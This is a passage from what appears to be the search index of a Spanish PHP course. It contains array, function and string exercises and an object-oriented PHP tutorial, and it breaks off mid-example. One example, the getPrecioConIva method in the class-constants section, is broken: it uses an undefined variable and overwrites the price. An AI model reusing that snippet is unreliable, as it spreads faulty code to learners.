5 personas (<code>nombre =&gt; altura</code>). Posteriormente, recorre el array y mu\u00e9stralo en una tabla HTML. Finalmente a\u00f1ade una \u00faltima fila a la tabla con la altura media.</p> </li> <li> <p><code>236personas.php</code>: Mediante un array bidimensional, almacena el nombre, altura y email de 5 personas. Para ello, crea un array de personas, siendo cada persona un array asociativo: <code>[ ['nombre'=&gt;'Rasmus', 'altura'=&gt;182, 'email'=&gt;'rasmus@lerdorf.com'],[\u2026],\u2026 ]</code> Posteriormente, recorre el array y mu\u00e9stralo en una tabla HTML.</p> </li> <li> <p>Investiga sobre el uso de funciones avanzadas como array_slice, array_splice, array_map, array_reduce y otras 2 m\u00e1s a tu elecci\u00f3n no vistas en el los apuntes. Recuerda que puedes consultar la documentaci\u00f3n oficial.</p> </li> <li> <p><code>238leerCantidad.html</code> y <code>238leerPersonas.php</code>: a partir de un formulario con un campo de <code>cantidad</code> de personas, generar un nuevo formulario para leer el nombre, altura y el email de <code>cantidad</code> personas. <code>238gestionarPersonas.php</code>: A partir de las personas introducidas, mostrar sus datos en una tabla, y posteriormente, destacar los datos del m\u00e1s alto y el del m\u00e1s bajo.</p> </li> <li> <p><code>239tablaDistintos.php</code>: Rellena un array bidimensional de 6 filas por 9 columnas con n\u00fameros aleatorios comprendidos entre 100 y 999 (ambos incluidos). Todos los n\u00fameros deben ser distintos, es decir, no se puede repetir ninguno. Muestra a continuaci\u00f3n por pantalla el contenido del array de tal forma que:</p> <ul> <li>La columna del m\u00e1ximo debe aparecer en azul.</li> <li>La fila del m\u00ednimo debe aparecer en verde</li> <li>El resto de nu\u0301meros deben aparecer en negro.</li> </ul> </li> </ol>"},{"location":"02php.html#funciones","title":"Funciones","text":"<ol> <li> <p><code>240arrayPar.php</code>: Crea las siguientes funciones:</p> <ul> <li>Una funci\u00f3n que averig\u00fce si un n\u00famero es par: <code>esPar(int $num): bool</code></li> <li>Una funci\u00f3n que devuelva un array de tama\u00f1o <code>$tam</code> con n\u00fameros aleatorios comprendido entre <code>$min</code> y <code>$max</code> : <code>arrayAleatorio(int $tam, int $min, int $max) : array</code></li> <li>Una funci\u00f3n que reciba un <code>$array</code> por referencia y devuelva la cantidad de n\u00fameros pares que hay almacenados: <code>arrayPares(array &amp;$array): int</code></li> </ul> </li> <li> <p><code>241parametrosVariables.php</code>: Crea las siguientes funciones:</p> <ul> <li>Una funci\u00f3n que devuelva el mayor de todos los n\u00fameros recibidos como par\u00e1metros: <code>function mayor(): int</code>. Utiliza las funciones <code>func_get_args()</code>, etc... No puedes usar la funci\u00f3n <code>max()</code>.</li> <li>Una funci\u00f3n que concatene todos los par\u00e1metros recibidos separ\u00e1ndolos con un espacio: <code>function concatenar(...$palabras) : string</code>. Utiliza el operador <code>...</code>.</li> </ul> </li> <li> <p><code>242matematicas.php</code>: A\u00f1ade las siguientes funciones:</p> <ul> <li><code>digitos(int $num): int</code> \u2192 devuelve la cantidad de d\u00edgitos de un n\u00famero.</li> <li><code>digitoN(int $num, int $pos): int</code> \u2192 devuelve el d\u00edgito que ocupa, empezando por la izquierda, la posici\u00f3n <code>$pos</code>.</li> <li><code>quitaPorDetras(int $num, int $cant): int</code> \u2192 le quita por detr\u00e1s (derecha) <code>$cant</code> d\u00edgitos.</li> <li><code>quitaPorDelante(int $num, int $cant): int</code> \u2192 le quita por delante (izquierda) <code>$cant</code> d\u00edgitos.</li> </ul> <p>Para probar las funciones, haz uso tanto de paso de argumentos posicionales como argumentos con nombre.</p> </li> <li> <p><code>243biblioteca.php</code>: crea un archivo con funciones para sumar, restar, multiplicar y dividir dos n\u00fameros. <code>243arrayFunciones.php</code>: haciendo uso de un array que almacene el nombre de las funciones del archivo anterior, a partir de dos n\u00fameros recibidos por URL, recorre el array e invoca a las funciones de manera din\u00e1mica haciendo uso de funciones variable.</p> </li> <li> <p><code>244euros.php</code>: Crea una biblioteca con dos funciones:</p> <ul> <li>peseta2euros: pasa de pesetas a euros</li> <li>euros2pesetas: pasa de euros a pesetas </li> </ul> <p>Cada funci\u00f3n debe recibir dos par\u00e1metros:</p> <ul> <li>La cantidad a transformar</li> <li>La cotizaci\u00f3n, con un par\u00e1metro por defecto con el factor de transformaci\u00f3n.</li> </ul> <p><code>244calculadoraEuros.php</code>: utiliza <code>243euros.php</code> y prueba las funciones pasando tanto cantidades con la cotizaci\u00f3n por defecto, como con nuevas cotizaciones. Recuerda que 1 euro son/eran 166.36 pesetas.</p> </li> <li> <p><code>245preparaTiquetCompra.php</code>: A partir de una cantidad de productos, leer el nombre y coste de la cantidad de productos indicados (similar al ejercicio 238, pero esta vez no hace falta crear el formulario con la cantidad, se recibe mediante un par\u00e1metro GET via URL). <code>245imprimeTiquetCompra.php</code>: Tras leer los datos del tiquet de compra, enumera en una tabla los productos, con su precio en euros y pesetas, y finalmente, en una \u00faltima fila, totalizar en ambas monedas. </p> </li> <li>A partir de los archivos creados en el ejercicio anterior, crea una plantilla mediante includes: <code>246preparaCompra.php</code>: similar a <code>245preparaTiquetCompra.php</code>, pero separando el encabezado (Supermercado Severo en <code>h1</code>) y el pie (Tu supermercado de confianza) en ficheros externos y referenciando a ellos mediante <code>include</code>. <code>246listaCompra.php</code>: recibe los datos del anterior, y reutiliza parte de <code>245imprimeTiquetCompra.php</code> cambiando la tabla por una lista desordenada de los productos junto a su precio.</li> <li> <p>Vamos a simular un formulario de acceso:</p> <ul> <li><code>247login.php</code>: el formulario de entrada, que solicita el usuario y contrase\u00f1a.</li> <li><code>247compruebaLogin.php</code>: recibe los datos y comprueba si son correctos (los usuarios se guardan en un array asociativo) pasando el control mediante el uso de <code>include</code> a:<ul> <li><code>247ok.php</code>: El usuario introducido es correcto</li> <li><code>247ko.php</code>: El usuario es incorrecto. Informar si ambos est\u00e1n mal o solo la contrase\u00f1a. Volver a mostrar el formulario de acceso.</li> </ul> </li> </ul> </li> </ol>"},{"location":"02php.html#funciones-predefinidas","title":"Funciones predefinidas","text":"<p>Todos los ejercicios se deben realizar creando nuevas funciones para encapsular el c\u00f3digo. Adem\u00e1s de la propia funci\u00f3n, el ejercicio debe contener c\u00f3digo para poder probarlo.</p> <ol> <li><code>250fraseImpares.php</code>: Lee una frase y devuelve una nueva con solo los caracteres de las posiciones impares.</li> <li><code>251vocales.php</code>: A partir de una frase, devuelve la cantidad de cada una de las vocales, y el total de ellas.</li> <li> <p><code>252analizador.php</code>: A partir de una frase con palabras s\u00f3lo separadas por espacios, devolver</p> <ul> <li>Letras totales y cantidad de palabras</li> <li>Una l\u00ednea por cada palabra indicando su tama\u00f1o</li> </ul> <p>Nota: no se puede usar <code>str_word_count</code> <code>252analizadorWC.php</code>: Investiga que hace la funci\u00f3n <code>str_word_count</code>, y vuelve a hacer el ejercicio.</p> </li> <li> <p><code>253cani.php</code>: EsCrIbE uNa FuNcI\u00f3N qUe TrAnSfOrMe UnA cAdEnA eN cAnI.</p> </li> <li><code>254palindromo.php</code>: Escribe una funci\u00f3n que devuelva un booleano indicando si una palabra es pal\u00edndroma (se lee igual de izquierda a derecha que de derecha a izquierda, por ejemplo, \u201cligar es ser agil\u201d).</li> <li><code>255codificar.php</code>: Utilizando las funciones para trabajar con caracteres, a partir de una cadena y un desplazamiento: <ul> <li>Si el desplazamiento es 1, sustituye la A por B, la B por C, etc.</li> <li>El desplazamiento no puede ser negativo</li> <li>Si se sale del abecedario, debe volver a empezar</li> <li>Hay que respetar los espacios, puntos y comas.</li> </ul> </li> <li><code>256filtrado.html</code>: Crea un programa que permita al usuario leer un conjunto de n\u00fameros separados por espacios. <code>256filtrado.php</code>: El programa filtrar\u00e1 los n\u00fameros le\u00eddos para volver a mostrar \u00fanicamente los n\u00fameros pares e indicar\u00e1 la cantidad existente.     <pre><code>Dame n\u00fameros: 1 4 7 9 23 10 8\nLos 3 n\u00fameros pares son: 4 10 8\n</code></pre></li> <li><code>257investiga.php</code>: Investiga las siguientes funciones de cadena (explica para qu\u00e9 sirven mediante comentarios, y programa un peque\u00f1o ejemplo de cada una de ellas): <code>ucwords</code>, <code>strrev</code>, <code>str_repeat</code> y <code>md5</code>.</li> </ol> <p>Los siguientes ejercicios se basan en la generaci\u00f3n de n\u00fameros aleatorios.</p> <ol> <li><code>260generador.php</code>: Crea una funci\u00f3n que permite generar una letra aleatoria, may\u00fascula o min\u00fascula.</li> <li><code>261generaContrasenya.php</code>: Crea una funci\u00f3n que a partir de un tama\u00f1o, genere una contrase\u00f1a aleatoria compuesta de letras y d\u00edgitos de manera aleatoria.</li> <li><code>262quinielas.php</code>: Crea las siguientes funciones:<ul> <li><code>quinigol() : array</code> \u2192 Genera un array multidimensional con 6 resultados aleatorios con combinaciones <code>[012M, 012M]</code></li> <li><code>quiniela() : array</code> \u2192 Genera un array con una combinaci\u00f3n de quiniela generada de manera aleatoria: 14 resultados con <code>1X2</code> y el pleno al quince con <code>[012M, 012M]</code></li> <li><code>tabla(array $quiniela) : string</code> \u2192 transforma un array de una quniela en una tabla HTML</li> </ul> </li> </ol>"},{"location":"03phpoo.html","title":"PHP Orientado a Objetos","text":"Duraci\u00f3n y criterios de evaluaci\u00f3n <p>Duraci\u00f3n estimada: 18 sesiones</p> <p>Resultado de aprendizaje:</p> <ol> <li>Desarrolla aplicaciones Web identificando y aplicando mecanismos para separar el c\u00f3digo de presentaci\u00f3n de la l\u00f3gica de negocio.</li> </ol> <p>Criterios de evaluaci\u00f3n:</p> <ol> <li>Se han identificado las ventajas de separar la l\u00f3gica de negocio de los aspectos de presentaci\u00f3n de la aplicaci\u00f3n. </li> <li>Se han analizado tecnolog\u00edas y mecanismos que permiten realizar esta separaci\u00f3n y sus caracter\u00edsticas principales. </li> <li>Se han utilizado objetos y controles en el servidor para generar el aspecto visual de la aplicaci\u00f3n web en el cliente. </li> <li>Se han utilizado formularios generados de forma din\u00e1mica para responder a los eventos de la aplicaci\u00f3n Web. </li> <li>Se han escrito aplicaciones Web con mantenimiento de estado y separaci\u00f3n de la l\u00f3gica de negocio. </li> <li>Se han aplicado los principios de la programaci\u00f3n orientada a objetos. </li> <li>Se ha probado y documentado el c\u00f3digo.</li> </ol>"},{"location":"03phpoo.html#31-clases-y-objetos","title":"3.1 Clases y Objetos","text":"<p>PHP sigue un paradigma de programaci\u00f3n orientada a objetos (POO) basada en clases. </p> <p>Un clase es un plantilla que define las propiedades y m\u00e9todos para poder crear objetos. De este manera, un objeto es una instancia de una clase.</p> <p>Tanto las propiedades como los m\u00e9todos se definen con una visibilidad (quien puede acceder)</p> <ul> <li>Privado - <code>private</code>:  S\u00f3lo puede acceder la propia clase.</li> <li>Protegido - <code>protected</code>: S\u00f3lo puede acceder la propia clase o sus descendientes.</li> <li>P\u00fablico - <code>public</code>: Puede acceder cualquier otra clase.</li> </ul> <p>Pero a diferencia de otros lenguajes como Java, no podemos indicar el nivel de visibilidad de la clase. En PHP, todas las clases son p\u00fablicas por definici\u00f3n.</p> <p>Para declarar una clase, se utiliza la palabra clave <code>class</code> seguido del nombre de la clase. Para instanciar un objeto a partir de la clase, se utiliza <code>new</code>:</p> <pre><code>&lt;?php\nclass NombreClase {\n    // propiedades \n    // y m\u00e9todos \n}\n\n$ob = new NombreClase();\n</code></pre> <p>Clases con may\u00fascula</p> <p>Todas las clases empiezan por letra may\u00fascula.</p> <p>Cuando un proyecto crece, es normal modelar las clases mediante UML. La clases se representan mediante un cuadrado, separando el nombre, de las propiedades y los m\u00e9todos:</p> <p></p> <p>Una vez que hemos creado un objeto, se utiliza el operador <code>-&gt;</code> para acceder a una propiedad o un m\u00e9todo:</p> <pre><code>$objeto-&gt;propiedad;\n$objeto-&gt;m\u00e9todo(par\u00e1metros);\n</code></pre> <p>Si desde dentro de la clase, queremos acceder a una propiedad o m\u00e9todo de la misma clase, utilizaremos la referencia <code>$this</code>;</p> <pre><code>$this-&gt;propiedad;\n$this-&gt;m\u00e9todo(par\u00e1metros);  \n</code></pre> <p>As\u00ed pues, como ejemplo, codificar\u00edamos una persona en el fichero <code>Persona.php</code> como:</p> <pre><code>&lt;?php\nclass\u00a0Persona\u00a0{\n    private\u00a0string $nombre;\n\n    public\u00a0function\u00a0setNombre(string $nom)\u00a0{\n        $this-&gt;nombre=$nom;\n    }\n\n    public\u00a0function\u00a0imprimir(){\n        echo\u00a0$this-&gt;nombre;\n        echo\u00a0'&lt;br&gt;';\n    }\n}\n\n$bruno\u00a0=\u00a0new\u00a0Persona(); // creamos un objeto\n$bruno-&gt;setNombre(\"Bruno\u00a0D\u00edaz\");\n$bruno-&gt;imprimir();\n</code></pre> <p>Aunque se pueden declarar varias clases en el mismo archivo, es una mala pr\u00e1ctica. As\u00ed pues, cada fichero contedr\u00e1 una sola clase, y se nombrar\u00e1 con el nombre de la clase.</p> <p>Constantes como atributos</p> <p>Es posible definir una constante como atributo de una clase, pero ojo, que s\u00f3lo es posible definir su tipo de dato a partir de PHP 8.3.</p> <pre><code>&lt;?php\nclass\u00a0Producto\u00a0{\n    public const float IVA = 0.21; // Sin \"float\" para versiones &lt; PHP 8.3\n\n    private\u00a0string $nombre;\n    private\u00a0string $precio;\n\n    // ...\n\n    public\u00a0function\u00a0getPrecioConIva(): float\u00a0{\n        return $this-&gt;precio=$nom * ($this-&gt;precio * self::IVA);\n    }\n}\n\n// MAIN...\necho Producto::IVA;\n</code></pre>"},{"location":"03phpoo.html#32-encapsulacion","title":"3.2 Encapsulaci\u00f3n","text":"<p>Las propiedades se definen privadas o protegidas (si queremos que las clases heredadas puedan acceder).</p> <p>Para cada propiedad, se a\u00f1aden m\u00e9todos p\u00fablicos (getter/setter):</p> <pre><code>public setPropiedad(tipo $param)\npublic getPropiedad() : tipo\n</code></pre> <p>Las constantes se definen p\u00fablicas para que sean accesibles por todos los recursos.</p> <pre><code>&lt;?php\nclass\u00a0MayorMenor\u00a0{\n    private\u00a0int $mayor;\n    private\u00a0int $menor;\n\n    public\u00a0function\u00a0setMayor(int\u00a0$may)\u00a0{\n        $this-&gt;mayor\u00a0=\u00a0$may;\n    }\n\n    public\u00a0function\u00a0setMenor(int\u00a0$men)\u00a0{\n        $this-&gt;menor\u00a0=\u00a0$men;\n    }\n\n    public\u00a0function\u00a0getMayor()\u00a0:\u00a0int\u00a0{\n        return\u00a0$this-&gt;mayor;\n    }\n\n    public\u00a0function\u00a0getMenor()\u00a0:\u00a0int\u00a0{\n        return\u00a0$this-&gt;menor;\n    }\n}\n</code></pre>"},{"location":"03phpoo.html#recibirenviar-objetos","title":"Recibir/enviar objetos","text":"<p>Es recomendable indicarlo en el tipo de par\u00e1metros. Si el objeto puede devolver nulos se pone <code>?</code> delante del nombre de la clase.</p> <p>Objetos por referencia</p> <p>Los objetos que se env\u00edan y reciben como par\u00e1metros siempre se pasan por referencia.</p> <pre><code>&lt;?php\nfunction\u00a0maymen(array\u00a0$numeros)\u00a0:\u00a0?MayorMenor\u00a0{\n    $a\u00a0=\u00a0max($numeros);\n    $b\u00a0=\u00a0min($numeros);\n\n    $result\u00a0=\u00a0new\u00a0MayorMenor();\n    $result-&gt;setMayor($a);\n    $result-&gt;setMenor($b);\n\n    return\u00a0$result;\n}\n\n$resultado\u00a0=\u00a0\u00a0maymen([1,76,9,388,41,39,25,97,22]);\necho\u00a0\"&lt;br&gt;Mayor:\u00a0\".$resultado-&gt;getMayor();\necho\u00a0\"&lt;br&gt;Menor:\u00a0\".$resultado-&gt;getMenor();\n</code></pre>"},{"location":"03phpoo.html#33-constructor","title":"3.3 Constructor","text":"<p>El constructor de los objetos se define mediante el m\u00e9todo m\u00e1gico <code>__construct</code>. Puede o no tener par\u00e1metros, pero s\u00f3lo puede haber un \u00fanico constructor.</p> <pre><code>&lt;?php\nclass\u00a0Persona\u00a0{\n    private\u00a0string $nombre;\n\n    public\u00a0function\u00a0__construct(string $nom)\u00a0{\n        $this-&gt;nombre = $nom;\n    }\n\n    public\u00a0function\u00a0imprimir(){\n    \u00a0\u00a0echo\u00a0$this-&gt;nombre;\n    \u00a0\u00a0echo\u00a0'&lt;br&gt;';\n    }\n}\n\n$bruno\u00a0=\u00a0new\u00a0Persona(\"Bruno\u00a0D\u00edaz\");\n$bruno-&gt;imprimir();\n</code></pre>"},{"location":"03phpoo.html#constructores-en-php-8","title":"Constructores en PHP 8","text":"<p>Una de las grandes novedades que ofrece PHP 8 es la simplificaci\u00f3n de los constructores con par\u00e1metros, lo que se conoce como promoci\u00f3n de las propiedades del constructor.</p> <p>Para ello, en vez de tener que declarar las propiedades como privadas o protegidas, y luego dentro del constructor tener que asignar los par\u00e1metros a est\u00e1s propiedades, el propio constructor promociona las propiedades.</p> <p>Ve\u00e1moslo mejor con un ejemplo. Imaginemos una clase <code>Punto</code> donde queramos almacenar sus coordenadas:</p> <pre><code>&lt;?php\nclass Punto {\n    protected float $x;\n    protected float $y;\n    protected float $z;\n\n    public function __construct(\n        float $x = 0.0,\n        float $y = 0.0,\n        float $z = 0.0\n    ) {\n        $this-&gt;x = $x;\n        $this-&gt;y = $y;\n        $this-&gt;z = $z;\n    }\n}\n</code></pre> <p>En PHP 8, quedar\u00eda del siguiente modo (mucho m\u00e1s corto, lo que facilita su legibilidad):</p> <pre><code>&lt;?php\nclass Punto {\n    public function __construct(\n        protected float $x = 0.0,\n        protected float $y = 0.0,\n        protected float $z = 0.0,\n    ) {}\n}\n</code></pre> <p>Opciones no v\u00e1lidas en el constructor</p> <p>Para inicializar las propiedades directamente en los par\u00e1metros del constructor, estas han de ser literales como n\u00fameros, cadenas, booleanos, null, o arrays simples. Cualquier otra cosa que implique l\u00f3gica o llamadas a funciones debe ir en el cuerpo del constructor, como por ejemplo instanciar un objeto de otra clase.</p> <p>El orden importa</p> <p>A la hora de codificar el orden de los elementos debe ser:</p> <pre><code>&lt;?php\ndeclare(strict_types=1);\n\nclass NombreClase {\n    // propiedades\n\n    // constructor\n\n    // getters - setters\n\n    // resto de m\u00e9todos\n}\n?&gt;\n</code></pre>"},{"location":"03phpoo.html#34-clases-estaticas","title":"3.4 Clases est\u00e1ticas","text":"<p>Son aquellas que tienen propiedades y/o m\u00e9todos est\u00e1ticos (tambi\u00e9n se conocen como de clase, por que su valor se comparte entre todas las instancias de la misma clase).</p> <p>Se declaran con <code>static</code> y se referencian con <code>::</code>.</p> <ul> <li>Si queremos acceder a un m\u00e9todo o atributo est\u00e1tico, o a una constante, se antepone el nombre de la clase: <code>Producto::nuevoProducto()</code> o <code>Producto::$numProductos</code>.</li> <li>Si desde dentro de la clase queremos llamar a un m\u00e9todo o atributo est\u00e1tico propio, o a una constante, se utiliza la referencia <code>self</code>: <code>self::nuevoProducto</code> o <code>self::$numProductos</code>.</li> </ul> <pre><code>&lt;?php\nclass Producto {\n    const IVA = 0.23;\n    public static $numProductos = 0; \n\n    public static function nuevoProducto() {\n        self::$numProductos++;\n    }\n}\n\nProducto::nuevoProducto();\n$nProductos = Producto::$numProductos;\n$impuesto = Producto::IVA;\n</code></pre> <p>Tambi\u00e9n podemos tener clases normales que tengan alguna propiedad est\u00e1tica:</p> <pre><code>&lt;?php\nclass\u00a0Producto\u00a0{\n    const\u00a0IVA\u00a0=\u00a00.23;\n    private\u00a0static\u00a0$numProductos\u00a0=\u00a00;\u00a0\n    private\u00a0$codigo;\n\n    public\u00a0function\u00a0__construct(string\u00a0$cod)\u00a0{\n        self::$numProductos++;\n        $this-&gt;codigo\u00a0=\u00a0$cod;\n    }\n\n    public\u00a0function\u00a0mostrarResumen()\u00a0:\u00a0string\u00a0{\n        return\u00a0\"El\u00a0producto\u00a0\".$this-&gt;codigo.\" es\u00a0el\u00a0n\u00famero\u00a0\".self::$numProductos;\n    }\n}\n\n$prod1\u00a0=\u00a0new\u00a0Producto(\"PS5\");\n$prod2\u00a0=\u00a0new\u00a0Producto(\"XBOX\u00a0Series\u00a0X\");\n$prod3\u00a0=\u00a0new\u00a0Producto(\"Nintendo\u00a0Switch\");\necho\u00a0$prod3-&gt;mostrarResumen();\n</code></pre>"},{"location":"03phpoo.html#35-introspeccion","title":"3.5 Introspecci\u00f3n","text":"<p>Al trabajar con clases y objetos, existen un conjunto de funciones ya definidas por el lenguaje que permiten obtener informaci\u00f3n sobre los objetos:</p> <ul> <li><code>instanceof</code>: permite comprobar si un objeto es de una determinada clase</li> <li><code>get_class</code>: devuelve el nombre de la clase</li> <li><code>get_declared_class</code>: devuelve un array con los nombres de las clases definidas en el script actual</li> <li><code>class_alias</code>: crea un alias</li> <li><code>class_exists</code> / <code>method_exists</code> / <code>property_exists</code>: <code>true</code> si la clase / m\u00e9todo / propiedad est\u00e1 definida</li> <li><code>get_class_methods</code> / <code>get_class_vars</code> / <code>get_object_vars</code>: Devuelve un array con los nombres de los m\u00e9todos / propiedades de una clase / propiedades de un objeto que son accesibles desde d\u00f3nde se hace la llamada.</li> </ul> <p>Un ejemplo de estas funciones puede ser el siguiente:</p> <pre><code>&lt;?php\n$p\u00a0=\u00a0new\u00a0Producto(\"PS5\");\nif\u00a0($p\u00a0instanceof\u00a0Producto)\u00a0{\n    echo\u00a0\"Es\u00a0un\u00a0producto\";\n    echo\u00a0\"La\u00a0clase\u00a0es\u00a0\".get_class($p);\n\n    class_alias(\"Producto\",\u00a0\"Articulo\");\n    $c\u00a0=\u00a0new\u00a0Articulo(\"Nintendo\u00a0Switch\");\n    echo\u00a0\"Un\u00a0articulo\u00a0es\u00a0un\u00a0\".get_class($c);\n\n    print_r(get_class_methods(\"Producto\"));\n    print_r(get_class_vars(\"Producto\"));\n    print_r(get_object_vars($p));\n\n    if\u00a0(method_exists($p,\u00a0\"mostrarResumen\"))\u00a0{\n        $p-&gt;mostrarResumen();\n    }\n}\n</code></pre> <p>Clonado</p> <p>Al asignar dos objetos no se copian, se crea una nueva referencia. Si queremos una copia, hay que clonarlo mediante el m\u00e9todo <code>clone(object) : object</code></p> <p>Si queremos modificar el clonado por defecto, hay que definir el m\u00e9todo m\u00e1gico <code>__clone()</code> que se llamar\u00e1 despu\u00e9s de copiar todas las propiedades.</p> <p>M\u00e1s informaci\u00f3n en https://www.php.net/manual/es/language.oop5.cloning.php</p>"},{"location":"03phpoo.html#36-herencia","title":"3.6 Herencia","text":"<p>PHP soporta herencia simple, de manera que una clase solo puede heredar de otra, no de dos clases a la vez. Para ello se utiliza la palabra clave <code>extends</code>. Si queremos que la clase A hereda de la clase B haremos:</p> <pre><code>class A extends B\n</code></pre> <p>El hijo hereda los atributos y m\u00e9todos p\u00fablicos y protegidos.</p> <p>Cada clase en un archivo</p> <p>Como ya hemos comentado, deber\u00edamos colocar cada clase en un archivo diferente para posteriormente utilizarlo mediante <code>include</code>. En los siguientes ejemplos los hemos colocado juntos para facilitar su legibilidad.</p> <p>Por ejemplo, tenemos una clase <code>Producto</code> y una <code>Tv</code> que hereda de <code>Producto</code>:</p> <pre><code>&lt;?php\nclass Producto {\n    public $codigo;\n    public $nombre;\n    public $nombreCorto;\n    public $PVP;\n\n    public function mostrarResumen() {\n        echo \"&lt;p&gt;Prod:\".$this-&gt;codigo.\"&lt;/p&gt;\";\n    }\n}\n\nclass Tv extends Producto {\n    public $pulgadas;\n    public $tecnologia;\n}\n</code></pre> <p>Podemos utilizar las siguientes funciones para averiguar si hay relaci\u00f3n entre dos clases:</p> <ul> <li><code>get_parent_class(object): string</code></li> <li><code>is_subclass_of(object, string): bool</code></li> </ul> <pre><code>&lt;?php\n$t = new Tv();\n$t-&gt;codigo = 33;\nif ($t instanceof Producto) {\n    echo $t-&gt;mostrarResumen();\n}\n\n$padre = get_parent_class($t);\necho \"&lt;br&gt;La clase padre es: \" . $padre;\n$objetoPadre = new $padre;\necho $objetoPadre-&gt;mostrarResumen();\n\nif (is_subclass_of($t, 'Producto')) {\n    echo \"&lt;br&gt;Soy un hijo de Producto\";\n}\n</code></pre>"},{"location":"03phpoo.html#sobreescribir-metodos","title":"Sobreescribir m\u00e9todos","text":"<p>Podemos crear m\u00e9todos en los hijos con el mismo nombre que el padre, cambiando su comportamiento. Para invocar a los m\u00e9todos del padre -&gt; <code>parent::nombreMetodo()</code></p> <pre><code>&lt;?php\nclass Tv extends Producto {\n   public $pulgadas;\n   public $tecnologia;\n\n   public function mostrarResumen() {\n      parent::mostrarResumen();\n      echo \"&lt;p&gt;TV \".$this-&gt;tecnologia.\" de \".$this-&gt;pulgadas.\"&lt;/p&gt;\";\n   }\n}\n</code></pre>"},{"location":"03phpoo.html#constructor-en-hijos","title":"Constructor en hijos","text":"<p>En los hijos no se crea ning\u00fan constructor de manera autom\u00e1tica. Por lo que si no lo hay, se invoca autom\u00e1ticamente al del padre. En cambio, si lo definimos en el hijo, hemos de invocar al del padre de manera expl\u00edcita.</p> PHP7PHP8 <pre><code>&lt;?php\nclass Producto {\n    public string $codigo;\n\n    public\u00a0function\u00a0__construct(string $codigo) {\n        $this-&gt;codigo =\u00a0$codigo;\n    }\n\n    public function mostrarResumen() {\n        echo \"&lt;p&gt;Prod:\".$this-&gt;codigo.\"&lt;/p&gt;\";\n    }\n}\n\nclass Tv extends Producto {\n    public $pulgadas;\n    public $tecnologia;\n\n    public\u00a0function\u00a0__construct(string\u00a0$codigo,\u00a0int\u00a0$pulgadas,\u00a0string\u00a0$tecnologia)\u00a0{\n        parent::__construct($codigo);\n        $this-&gt;pulgadas\u00a0=\u00a0$pulgadas;\n        $this-&gt;tecnologia\u00a0=\u00a0$tecnologia;\n    }\n\n    public function mostrarResumen() {\n        parent::mostrarResumen();\n        echo \"&lt;p&gt;TV \".$this-&gt;tecnologia.\" de \".$this-&gt;pulgadas.\"&lt;/p&gt;\";\n    }\n}\n</code></pre> <pre><code>&lt;?php\nclass Producto {\n    public\u00a0function\u00a0__construct(private string $codigo) { }\n\n    public function mostrarResumen() {\n        echo \"&lt;p&gt;Prod:\".$this-&gt;codigo.\"&lt;/p&gt;\";\n    }        \n}\n\nclass Tv extends Producto {\n\n    public\u00a0function\u00a0__construct(\n        string\u00a0$codigo,\n        private int\u00a0$pulgadas,\n        private string\u00a0$tecnologia)\n    {\n        parent::__construct($codigo);\n    }\n\n    public function mostrarResumen() {\n        parent::mostrarResumen();\n        echo \"&lt;p&gt;TV \".$this-&gt;tecnologia.\" de \".$this-&gt;pulgadas.\"&lt;/p&gt;\";\n    }\n}\n</code></pre>"},{"location":"03phpoo.html#37-clases-abstractas","title":"3.7 Clases abstractas","text":"<p>Las clases abstractas obligan a heredar de una clase, ya que no se permite su instanciaci\u00f3n. Se define mediante <code>abstract class NombreClase {</code>. Una clase abstracta puede contener propiedades y m\u00e9todos no-abstractos, y/o m\u00e9todos abstractos.</p> <pre><code>&lt;?php\n//\u00a0Clase\u00a0abstracta\nabstract\u00a0class\u00a0Producto\u00a0{\n    private\u00a0$codigo;\n    public\u00a0function\u00a0getCodigo()\u00a0:\u00a0string\u00a0{\n        return\u00a0$this-&gt;codigo;\n    }\n    //\u00a0M\u00e9todo\u00a0abstracto\n    abstract\u00a0public\u00a0function\u00a0mostrarResumen();\n}\n</code></pre> <p>Cuando una clase hereda de una clase abstracta, obligatoriamente debe implementar los m\u00e9todos que tiene el padre marcados como abstractos.</p> <pre><code>&lt;?php\nclass Tv extends Producto {\n    public $pulgadas;\n    public $tecnologia;\n\n    public function mostrarResumen() { //obligado a implementarlo\n        echo \"&lt;p&gt;C\u00f3digo \".$this-&gt;getCodigo().\"&lt;/p&gt;\";\n        echo \"&lt;p&gt;TV \".$this-&gt;tecnologia.\" de \".$this-&gt;pulgadas.\"&lt;/p&gt;\";\n    }\n}\n\n$t = new Tv();\necho $t-&gt;getCodigo();\n</code></pre>"},{"location":"03phpoo.html#38-clases-finales","title":"3.8 Clases finales","text":"<p>Son clases opuestas a abstractas, ya que evitan que se pueda heredar una clase o m\u00e9todo para sobreescribirlo.</p> <pre><code>&lt;?php\nclass\u00a0Producto\u00a0{\n    private\u00a0$codigo;\n\n    public\u00a0function\u00a0getCodigo()\u00a0:\u00a0string\u00a0{\n        return\u00a0$this-&gt;codigo;\n    }\n\n    final\u00a0public\u00a0function\u00a0mostrarResumen()\u00a0:\u00a0string\u00a0{\n        return\u00a0\"Producto\u00a0\".$this-&gt;codigo;\n    }\n}\n\n// No podremos heredar de Microondas\nfinal\u00a0class\u00a0Microondas\u00a0extends\u00a0Producto\u00a0{\n    private\u00a0$potencia;\n\n    public\u00a0function\u00a0getPotencia()\u00a0:\u00a0int\u00a0{\n        return\u00a0$this-&gt;potencia;\n    }\n\n    // No podemos implementar mostrarResumen()\n}\n</code></pre>"},{"location":"03phpoo.html#39-interfaces","title":"3.9 Interfaces","text":"<p>Permite definir un contrato con las firmas de los m\u00e9todos a cumplir. As\u00ed pues, s\u00f3lo contiene declaraciones de funciones y todas deben ser p\u00fablicas.</p> <p>Se declaran con la palabra clave <code>interface</code> y luego las clases que cumplan el contrato lo realizan mediante la palabra clave <code>implements</code>.</p> <pre><code>&lt;?php\ninterface Nombreable {\n// declaraci\u00f3n de funciones\n}\nclass NombreClase implements NombreInterfaz {\n// c\u00f3digo de la clase\n</code></pre> <p>Se permite la herencia de interfaces. Adem\u00e1s, una clase puede implementar varios interfaces (en este caso, s\u00ed soporta la herecia m\u00faltiple, pero s\u00f3lo de interfaces).</p> <pre><code>&lt;?php\ninterface\u00a0Mostrable\u00a0{\n    public\u00a0function\u00a0mostrarResumen()\u00a0:\u00a0string;\n}\n\ninterface\u00a0MostrableTodo\u00a0extends\u00a0Mostrable\u00a0{\n    public\u00a0function\u00a0mostrarTodo()\u00a0:\u00a0string;\n}\n\ninterface\u00a0Facturable\u00a0{\n    public\u00a0function\u00a0generarFactura()\u00a0:\u00a0string;\n}\n\nclass\u00a0Producto\u00a0implements\u00a0MostrableTodo,\u00a0Facturable\u00a0{\n    